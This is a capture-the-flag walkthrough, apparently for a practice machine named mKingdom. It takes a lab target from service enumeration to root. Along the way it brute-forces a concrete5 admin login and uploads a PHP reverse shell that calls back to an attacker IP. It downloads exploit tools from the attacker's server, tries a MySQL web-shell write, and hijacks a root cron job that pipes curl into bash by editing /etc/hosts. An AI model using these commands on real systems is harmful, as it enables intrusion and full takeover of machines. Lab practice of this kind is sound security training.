@@ -1,0 +1,836 @@
+MKINGDOM.
+
+
+
+
+ENUMERATING: SERVICES:
+Quick nmap scan:
+nmap -sS -sV -T4 10.10.39.195
+OUTPUT:
+PORT   STATE SERVICE VERSION
+85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+
+
+
+Note:
+Since it isn't the default http port (80), we need to specify it in the url.
+EXPLORING: WEBSITE:
+Vising http://10.10.39.195:85/, bowser welcomes us.
+There ins't really anything on the landing site, neither on the source (CTRL + U), so we can move on.
+
+
+
+
+ENUMERATION: DIRECTORIES:
+Note:
+We will do a shorter scan, so we can start looking around, and a longer one to keep running in the background.
+Quick gobuster scan:
+gobuster dir -u http://10.10.39.195:85 -w /usr/share/dirb/wordlists/common.txt 
+OUTPUT:
+/.htpasswd            (Status: 403) [Size: 288]
+/.hta                 (Status: 403) [Size: 283]
+/.htaccess            (Status: 403) [Size: 288]
+/app                  (Status: 301) [Size: 312] [--> http://10.10.39.195:85/app/]
+/index.html           (Status: 200) [Size: 647]
+/server-status        (Status: 403) [Size: 292]
+
+
+Longer gobuster scan:
+gobuster dir -u http://10.10.39.195:85 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+Note:
+No new paths.
+
+
+
+
+EXPLORING: http://10.10.39.195:85/app/:
+A button with text "jump" is displayed. 
+We click it.
+OUTPUT:
+10.10.39.195:85 says
+Make yourself confortable and enjoy my place.
+Note:
+We get redirected to: http://10.10.39.195:85/app/castle/
+
+
+
+
+EXPLORING: http://10.10.39.195:85/app/castle/
+We start by inspecting source (CTRL + U):
+OUTPUT (SNIPPET 1):
+    var CCM_DISPATCHER_FILENAME = "/app/castle/index.php";
+    var CCM_CID = 1;
+    var CCM_EDIT_MODE = false;
+    var CCM_ARRANGE_MODE = false;
+    var CCM_IMAGE_PATH = "/app/castle/concrete/images";
+    var CCM_TOOLS_PATH = "/app/castle/index.php/tools/required";
+    var CCM_APPLICATION_URL = "http://10.10.39.195:85/app/castle";
+    var CCM_REL = "/app/castle";
+    var CCM_ACTIVE_LOCALE = "en_US";
+Note:
+/app/castle/concrete/images: has nothing other than images.
+/app/castle/index.php/tools/required: displayserror 404.
+OUTPUT (SNIPPET 2):
+<meta name="generator" content="concrete5 - 8.5.2"/>
+Note: 
+The CMS used is concrete5 v8.5.2.
+
+
+Exploring redirects:
+1. http://10.10.39.195:85/app/castle/index.php/blog:
+Blog section template.
+Clicking on the social media buttons (bottom on the page), still default, they redirect to Concrete5 (name used before Concrete CMS). Though this is already explicitly declared "Built with concrete5 CMS".
+2. http://10.10.39.195:85/app/castle/index.php/contact:
+Has a contact form.
+3. Other buttons: FAQ / Help, Case Studies, Another Link:
+Redirect to landing page.
+Note:
+It looks like our vector probably is the form, or something based on the version of the CMS.
+Doing some research, we find an rce exploit: https://hackerone.com/reports/768322.
+From the looks of it, we need to get admin access before doing the exploit. 
+So we are missing enumeration.
+
+
+
+
+SEARCHING FOR A LOGIN PORTAL:
+Gobuster file scan (in ip:port):
+gobuster dir -u http://10.10.39.195:85 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+Note:
+Forced termination. Explanation in note (1).
+
+
+
+Gobuster file scan (in ip:port/app):
+gobuster dir -u http://10.10.39.195:85/app -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+Note:
+Forced termination. Explanation in note (1).
+
+
+Note (1):
+Stupidly, we didn't spot a log in button displayed at the bottom right of the page, redirecting to: http://10.10.39.195:85/app/castle/index.php/login
+
+
+
+
+SIGN IN PORTAL:
+We try credential pair admin|admin.
+OUTPUT:
+Invalid username or password.
+Note:
+The error doesn't specify that the username admin exists, but it probably does, since the default concrete5 admin credentials are a username of admin and a password that is set during the installation process.
+To bruteforce hydra, we need to find some values first.
+
+
+Hydra post web form bruteforce:
+sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
+
+
+Find username and password variable names:
+1. Open web inspector: CTRL + I.
+2. > Network
+3. Try random wrong credential pair (eg: wrong|wrong).
+4. Click "concrete" (post request sent when trying to log in).
+5. > Payload > Form Data > view source.
+OUTPUT:
+uName=wrong&uPassword=wrong&ccm_token=1753033009%3Af7ea10137673e2f7950f4fbb8ae55d02
+
+
+Find wrong login error message: 
+1. > Response.
+2. Look for error related messages.
+OUTPUT:
+ <div class="ccm-system-errors alert alert-danger alert-dismissable"><button type="button" class="close" data-dismiss="alert">×</button>
+                <div>Invalid username or password.</div>        	</div>
+Note:
+Error message is: Invalid username or password.
+
+
+Our filled in hydra command:
+sudo hydra -l admin -P ~/thm/rockyou.txt 10.10.39.195 -s 85 http-post-form "/app/castle/index.php/login/authenticate/concrete:uName=^USER^&uPassword=^PASS^&ccm_token=1753033009%3Af7ea10137673e2f7950f4fbb8ae55d02:Invalid username or password."
+OUTPUT:
+[85][http-post-form] host: 10.10.39.195   login: admin   password: rockyou
+[85][http-post-form] host: 10.10.39.195   login: admin   password: 12345678
+[85][http-post-form] host: 10.10.39.195   login: admin   password: princess
+[85][http-post-form] host: 10.10.39.195   login: admin   password: daniel
+[85][http-post-form] host: 10.10.39.195   login: admin   password: nicole
+[85][http-post-form] host: 10.10.39.195   login: admin   password: monkey
+[85][http-post-form] host: 10.10.39.195   login: admin   password: babygirl
+[85][http-post-form] host: 10.10.39.195   login: admin   password: iloveyou
+[85][http-post-form] host: 10.10.39.195   login: admin   password: lovely
+[85][http-post-form] host: 10.10.39.195   login: admin   password: jessica
+[85][http-post-form] host: 10.10.39.195   login: admin   password: 1234567
+[85][http-post-form] host: 10.10.39.195   login: admin   password: michael
+[85][http-post-form] host: 10.10.39.195   login: admin   password: ashley
+[85][http-post-form] host: 10.10.39.195   login: admin   password: qwerty
+[85][http-post-form] host: 10.10.39.195   login: admin   password: 654321
+[85][http-post-form] host: 10.10.39.195   login: admin   password: password
+Note:
+Looks like we got multiple passwords for admin (?)
+
+
+Try to log in:
+We use pair admin|rockyou.
+OUTPUT:
+Unable to complete action: your IP address has been banned. Please contact the administrator of this site for more information.
+Note:
+Even if we weren't blocked, it wouldn't work, since 2 or more valid passwords in the output means we have false positives.
+
+
+Note:
+New ip 10.10.208.149 due to machine reboot.
+We try to run other tools such as wfuzz, but we also get positives.
+It looks like the site always sends the a reply with the same size, and status 200.
+Proof of 200 replies:
+patator http_fuzz url=http://10.10.208.149:85/app/castle/index.php/login/authenticate/concrete method=POST body='uName=admin&uPassword=FILE0' 0=~/thm/rockyou.txt -x ignore:fgrep='Invalid username or password.'
+OUTPUT:
+18:57:11 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+18:57:11 patator    INFO - -----------------------------------------------------------------------------
+18:57:12 patator    INFO - 200  10169:-1       0.683 | 123456                             |     1 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.680 | 12345                              |     2 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.678 | 123456789                          |     3 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.674 | password                           |     4 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.672 | iloveyou                           |     5 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.657 | princess                           |     6 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.654 | 1234567                            |     7 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.613 | rockyou                            |     8 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.654 | 12345678                           |     9 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.642 | abc123                             |    10 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.671 | nicole                             |    11 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.663 | daniel                             |    12 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.612 | babygirl                           |    13 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.636 | monkey                             |    14 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.664 | lovely                             |    15 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.672 | jessica 
+...
+
+
+Note:
+Out of ideas, we manually try the top 10 most common passwords. Which are:
+123456
+password
+123456789
+12345678
+12345
+1234567
+admin
+123123
+qwerty
+abc123
+
+
+Trying admin|password, we manage to login. We get redirected to:
+http://10.10.208.149:85/app/castle/index.php/dashboard/welcome
+
+
+
+
+EXPLOIT:
+Note:
+We will follow the exploit we found earlier (https://hackerone.com/reports/768322).
+We use the searchbar to find allow file type settings:
+http://10.10.208.149:85/app/castle/index.php/dashboard/system/files/filetypes
+Then add .php, and enable it.
+
+Note:
+We use the search bar again and look for the file manager, where we will upload our shell.
+To run the pentestmonkey php reverse shell (https://pentestmonkey.net/tools/web-shells/php-reverse-shell), we update ip and port to:
+$ip = '10.23.25.109';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+
+
+Start listener:
+nc -lnvp 4444
+
+
+Upload shell to file manager.
+Note:
+Green line means the upload is complete and we can close.
+OUTPUT (after closing):
+1 file uploaded
+Properties
+URL to File
+
+http://10.10.208.149:85/app/castle/application/files/6817/5312/0157/php-reverse-shell.php
+
+Tracked URL
+
+http://10.10.208.149:85/app/castle/index.php/download_file/28/0
+
+Title
+
+php-reverse-shell.php
+
+Description
+
+None
+
+Tags
+
+None
+
+Sets
+None
+
+Custom Attributes
+Width
+
+None
+Height
+
+None
+Duration
+
+None
+
+
+Run the shell:
+Visit: 
+http://10.10.208.149:85/app/castle/application/files/6817/5312/0157/php-reverse-shell.php
+OUTPUT:
+$
+
+
+Stabilize shell:
+1. Spawn a tty: python3 -c 'import pty; pty.spawn("/bin/bash")'
+2. Set TERM: export TERM=xterm
+3. Background shell: CTRL + Z
+4. Fix terminal mode: stty raw -echo
+5. Bring shell back: fg
+Note:
+Type anything to get the prompt back after running fg.
+
+
+
+
+USER FLAG:
+Find user flag:
+find / -name "user.txt" 2>/dev/null
+Note:
+No output.
+
+
+
+
+
+PRIVESC:
+Check sudo permissions:
+sudo -l
+OUTPUT:
+[sudo] password for www-data:
+Note:
+We don't know the password.
+
+
+Check kernel info:
+uname -a
+OUTPUT:
+Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+Note:
+We found a matching exploit.
+
+
+
+
+EXPLOIT ATTEMPT: Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation (https://www.exploit-db.com/exploits/41458):
+Start server:
+python3 -m http.server 8000
+
+
+Download from machine:
+curl http://10.23.25.109:8000/kernel_exploit.c -o /tmp/exploit.c
+
+
+Compile exploit:
+cd tmp
+gcc exploit.c -o exploit
+
+
+Run exploit:
+./exploit
+OUTPUT:
+./exploit
+unshare(CLONE_NEWUSER): Operation not permitted
+Note:
+Dead end.
+
+
+
+
+VULN ASSESSMENT:
+Check suid binaries:
+find / -perm -4000 -type f 2>/dev/null
+OUTPUT:
+/bin/cat
+/bin/umount
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping6
+/bin/ping
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/lppasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/mtr
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+
+
+
+
+EXPLOIT ATTEMPT: CAT SUID:
+Check shadow suid:
+
+Exploit:
+LFILE=/etc/shadow
+/bin/cat "$LFILE"
+OUTPUT:
+/bin/cat: /etc/shadow: Permission denied
+
+
+
+
+VULN ASSESMENT: LINPEAS:
+Download linpeas:
+curl http://10.23.25.109:8000/linpeas.sh -o /tmp/linpeas.sh
+
+
+Give perms and run:
+cd tmp
+chmod +x linpeas.sh
+./linpeas.sh
+Note:
+We get cred pair mKingdom|toadisthebest for: /var/www/html/app/castle/application/config/database.php
+
+
+Check users:
+cd /home
+ls -l
+OUTPUT:
+mario  toad
+
+
+Note:
+We will try our password (toadisthebest) with both users.
+toad worked:
+sudo su toad
+OUTPUT:
+toad@mkingdom:/home$ 
+
+
+
+
+
+USER TOAD:
+List directory:
+ls -l
+OUTPUT:
+drwxr-xr-x 2 toad toad 4096 Nov 26  2023 Desktop
+drwxr-xr-x 2 toad toad 4096 Nov 26  2023 Documents
+drwxr-xr-x 2 toad toad 4096 Nov 26  2023 Downloads
+drwxr-xr-x 2 toad toad 4096 Nov 26  2023 Music
+drwxr-xr-x 2 toad toad 4096 Nov 26  2023 Pictures
+drwxr-xr-x 2 toad toad 4096 Nov 26  2023 Public
+-rw-r--r-- 1 toad toad  914 Nov 25  2023 smb.txt
+drwxr-xr-x 2 toad toad 4096 Nov 26  2023 Templates
+drwxr-xr-x 2 toad toad 4096 Nov 26  2023 Videos
+
+
+Check smb:
+cat smb.txt
+OUTPUT:
+Save them all Mario!
+
+                                      \| /
+                    ....'''.           |/
+             .''''''        '.       \ |
+             '.     ..     ..''''.    \| /
+              '...''  '..''     .'     |/
+     .sSSs.             '..   ..'    \ |
+    .P'  `Y.               '''        \| /
+    SS    SS                           |/
+    SS    SS                           |
+    SS  .sSSs.                       .===.
+    SS .P'  `Y.                      | ? |
+    SS SS    SS                      `==='
+    SS ""    SS
+    P.sSSs.  SS
+    .P'  `Y. SS
+    SS    SS SS                 .===..===..===..===.
+    SS    SS SS                 |   || ? ||   ||   |
+    ""    SS SS            .===.`==='`==='`==='`==='
+  .sSSs.  SS SS            |   |
+ .P'  `Y. SS SS       .===.`==='
+ SS    SS SS SS       |   |
+ SS    SS SS SS       `==='
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+
+
+Check if smb is running:
+ps aux | grep smb
+OUTPUT:
+toad      4507  0.0  0.2  15956  2256 pts/6    S+   14:42   0:00 grep --color=auto smb
+Note:
+It isn't.
+
+
+Check hidden files:
+ls -la
+OUTPUT:
+drwxrwx--- 16 toad toad 4096 Jan 29  2024 .
+drwxr-xr-x  4 root root 4096 Jun  9  2023 ..
+lrwxrwxrwx  1 root root    9 Nov 27  2023 .bash_history -> /dev/null
+-rw-r--r--  1 toad toad  220 Jun  8  2023 .bash_logout
+-rw-r--r--  1 toad toad 3693 Nov 25  2023 .bashrc
+drwx------ 11 toad toad 4096 Nov 28  2023 .cache
+drwx------  3 toad toad 4096 Nov 26  2023 .compiz
+drwx------ 14 toad toad 4096 Nov 26  2023 .config
+drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Desktop
+drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Documents
+drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Downloads
+drwx------  3 toad toad 4096 Dec 10  2023 .gconf
+-rw-------  1 toad toad 1710 Dec 10  2023 .ICEauthority
+drwx------  3 toad toad 4096 Nov 26  2023 .local
+drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Music
+-rw-rw-r--  1 toad toad  637 Jan 29  2024 .mysql_history
+drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Pictures
+-rw-r--r--  1 toad toad  675 Jun  8  2023 .profile
+drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Public
+-rw-r--r--  1 toad toad  914 Nov 25  2023 smb.txt
+drwxrwx---  2 toad toad 4096 Nov 27  2023 .ssh
+drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Templates
+drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Videos
+-rw-------  1 toad toad   57 Dec 10  2023 .Xauthority
+-rw-------  1 toad toad 1676 Dec 10  2023 .xsession-errors
+-rw-------  1 toad toad 1675 Nov 30  2023 .xsession-errors.old
+
+
+check sql history:
+cat .mysql_history
+OUTPUT:
+CREATE DATABASE mKingdom;
+create database 'mKingdom';
+show databases;
+;
+create database 'mkingdom'
+ls -al
+drop database mkingdom;
+show databases;
+FLUSH PRIVILEGES;
+GRANT ALL PRIVILEGES ON mkingdom.* TO 'toad'@'localhost';
+CREATE DATABASE mkingdom;
+DROP DATABASE mkingdom;
+delete db mkingdom;
+exit;
+;
+eit
+FLUSH PRIVILEGES;
+GRANT ALL PRIVILEGES ON mkingdom.* TO 'toad'@'localhost';
+show databases;
+CREATE DATABASE mkingdom;
+select * from user;
+show tables;
+use mysql;
+show databases;
+EXIT;
+FLUSH PRIVILEGES;
+GRANT ALL PRIVILEGES ON *.* TO 'toad'@'localhost' WITH GRANT OPTION;
+CREATE USER 'toad'@'localhost' IDENTIFIED BY 'toadisthebest';
+Note:
+Same user and password we found before. This time, we will use them, since we don't have any clear privesc path.
+
+
+Log in to mysql:
+mysql -u toad -ptoadisthebest
+
+
+Try to spawn root rev shell:
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/tmp/shell.php';
+OUTPUT:
+ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+Note:
+secure_file_priv prevents us from writing.
+
+
+Check allowed files:
+SHOW VARIABLES LIKE 'secure_file_priv';
+OUTPUT:
++------------------+-----------------------+
+| Variable_name    | Value                 |
++------------------+-----------------------+
+| secure_file_priv | /var/lib/mysql-files/ |
++------------------+-----------------------+
+
+
+Check if we are root (outside mysql prompt):
+ps aux | grep mysql
+OUTPUT:
+mysql     1299  0.0  5.1 879984 52300 ?        Ssl  12:22   0:06 /usr/sbin/mysqld
+toad      4632  0.0  0.2  15960  2252 pts/6    S+   14:51   0:00 grep --color=auto mysql
+
+
+Run linpeas again:
+./tmp/linpeas.sh
+OUTPUT:
+USER=toad
+SHLVL=2
+HOME=/home/toad
+OLDPWD=/home/toad	
+PWD_token=aWthVGVOVEFOdEVTCg==
+Note:
+Pwd_token looks encoded in base 64.
+
+
+Pwd_token decode:
+echo "aWthVGVOVEFOdEVTCg=="|base64 -d
+OUTPUT:
+ikaTeNTANtES
+
+
+Trying string to log in as mario:
+su mario
+OUTPUT:
+mario@mkingdom:/$ 
+
+
+Check sudo permissions:
+sudo -l
+OUTPUT:
+Matching Defaults entries for mario on mkingdom:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    pwfeedback
+
+User mario may run the following commands on mkingdom:
+    (ALL) /usr/bin/id
+
+
+
+
+
+USER FLAG:
+Note:
+It's probably on marios home, since hes the only user left to check.
+Move into mario:
+cd /home/mario
+
+
+Check directory:
+ls 
+OUTPUT:
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+
+
+Check flag:
+cat user.txt
+OUTPUT:
+cat: user.txt: Permission denied
+
+
+
+
+
+PRIVESC:
+Check cronjobs (1):
+cat /etc/crontab
+OUTPUT:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+Check cronjobs (2):
+ls -la /etc/cron.*
+OUTPUT:
+/etc/cron.d:
+total 28
+drwxr-xr-x   2 root root  4096 Jun  8  2023 .
+drwxr-xr-x 133 root root 12288 Jul 21 12:22 ..
+-rw-r--r--   1 root root   188 Feb 19  2014 anacron
+-rw-r--r--   1 root root   510 Apr 22  2019 php5
+-rw-r--r--   1 root root   102 Feb  9  2013 .placeholder
+
+/etc/cron.daily:
+total 88
+drwxr-xr-x   2 root root  4096 Jun  7  2023 .
+drwxr-xr-x 133 root root 12288 Jul 21 12:22 ..
+-rwxr-xr-x   1 root root   311 Feb 19  2014 0anacron
+-rwxr-xr-x   1 root root   625 Apr  3  2019 apache2
+-rwxr-xr-x   1 root root   376 Apr  4  2014 apport
+-rwxr-xr-x   1 root root 15481 Apr 10  2014 apt
+-rwxr-xr-x   1 root root   355 Jun  4  2013 bsdmainutils
+-rwxr-xr-x   1 root root   384 Mar 23  2014 cracklib-runtime
+-rwxr-xr-x   1 root root   256 Mar  7  2014 dpkg
+-rwxr-xr-x   1 root root   372 Jan 22  2014 logrotate
+-rwxr-xr-x   1 root root  1261 Sep 23  2014 man-db
+-rwxr-xr-x   1 root root   435 Jun 20  2013 mlocate
+-rwxr-xr-x   1 root root   249 Feb 16  2014 passwd
+-rw-r--r--   1 root root   102 Feb  9  2013 .placeholder
+-rwxr-xr-x   1 root root  2417 May 13  2013 popularity-contest
+-rwxr-xr-x   1 root root   214 Mar 27  2017 update-notifier-common
+-rwxr-xr-x   1 root root   328 Jul 18  2014 upstart
+
+/etc/cron.hourly:
+total 20
+drwxr-xr-x   2 root root  4096 Mar  4  2019 .
+drwxr-xr-x 133 root root 12288 Jul 21 12:22 ..
+-rw-r--r--   1 root root   102 Feb  9  2013 .placeholder
+
+/etc/cron.monthly:
+total 24
+drwxr-xr-x   2 root root  4096 Mar  4  2019 .
+drwxr-xr-x 133 root root 12288 Jul 21 12:22 ..
+-rwxr-xr-x   1 root root   313 Feb 19  2014 0anacron
+-rw-r--r--   1 root root   102 Feb  9  2013 .placeholder
+
+/etc/cron.weekly:
+total 40
+drwxr-xr-x   2 root root  4096 Jun  7  2023 .
+drwxr-xr-x 133 root root 12288 Jul 21 12:22 ..
+-rwxr-xr-x   1 root root   312 Feb 19  2014 0anacron
+-rwxr-xr-x   1 root root   730 Feb 23  2014 apt-xapian-index
+-rwxr-xr-x   1 root root   427 Apr 16  2014 fstrim
+-rwxr-xr-x   1 root root   771 Sep 23  2014 man-db
+-rw-r--r--   1 root root   102 Feb  9  2013 .placeholder
+-rwxr-xr-x   1 root root   211 Mar 27  2017 update-notifier-common
+Note:
+Nothing interest from this one or past commands.
+
+
+Note:
+We find TheCastleApp runs every minute.
+Files ran:
+grep -lr 'TheCastleApp' /var 2>/dev/null
+OUTPUT:
+/var/log/up.log
+/var/www/html/app/castle/application/counter.sh
+
+
+Check counter script:
+cat /var/www/html/app/castle/application/counter.sh
+OUTPUT:
+#!/bin/bash
+echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."
+
+
+Check if mario runs counter:
+crontab -l
+OUTPUT:
+no crontab for mario.
+Note:
+After checking it also isn't ran as toad or www-data. So it must be root.
+
+
+Note:
+To get more info on what the script does, we get another tool.
+Download on attacker and start server:
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy
+python3 -m http.server 8000
+
+
+Download from attacked:
+wget http://10.23.25.109:8000/pspy -O /tmp/pspy
+
+Make pspy executable, and run storing output:
+chmod u+x /tmp/pspy
+/tmp/pspy > /tmp/pspy.txt &
+cat /tmp/pspy.txt
+
+
+Read txt:
+cat /tmp/pspy.txt
+OUTPUT:
+/bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
+
+
+Note:
+We can try manipulate the host.
+Check hosts permissions:
+ls -l /etc/hosts
+OUTPUT:
+-rw-rw-r-- 1 root mario 342 Jan 26  2024 /etc/hosts
+
+
+Check content of hosts:
+cat /etc/hosts
+OUTPUT:
+127.0.0.1	localhost
+127.0.1.1	mkingdom.thm
+127.0.0.1	backgroundimages.concrete5.org
+127.0.0.1       www.concrete5.org
+127.0.0.1       newsflow.concrete5.org
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+Create backup of hosts:
+cp /etc/hosts /tmp/hosts.bak
+
+
+Change kindom ip:
+cat /etc/hosts | sed 's/127\.0\.1\.1\tmkingdom\.thm/10.23.25.109\t\tmkingdom.thm/g' > /tmp/replace_hosts
+
+
+Overwrite hosts:
+cat /tmp/replace_hosts > /etc/hosts
+
+
+Note:
+We will now start the steps to create our fake script.
+Clone directory structure as in the cron job:
+mkdir -p /tmp/app/castle/application
+
+
+Create fake script:
+nano /tmp/app/castle/application/counter.sh
+Contents:
+#! /usr/bin/env bash
+
+# Set SUID bit on /bin/bash binary
+chmod 4755 /bin/bash
+
+
+Start server and wait:
+sudo python3 -m http.server 85 --directory /tmp
+
+
+Check if bash has suid:
+ls -l /bin/bash
+OUTPUT:
+-rwsr-xr-x 
+
+
+Run bash with privileges:
+/bin/bash -ip
+OUTPUT:
+bash-4.3#
+
+
